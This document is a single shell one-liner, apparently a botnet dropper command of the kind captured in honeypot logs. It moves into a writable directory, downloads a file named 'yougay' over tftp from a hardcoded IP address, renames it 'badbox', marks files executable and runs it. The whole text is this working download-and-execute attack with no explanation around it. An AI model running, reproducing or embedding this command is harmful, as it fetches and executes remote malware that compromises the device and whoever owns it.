cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 50.115.166.193 -c get yougay;cat yougay >badbox;chmod +x *;./badbox
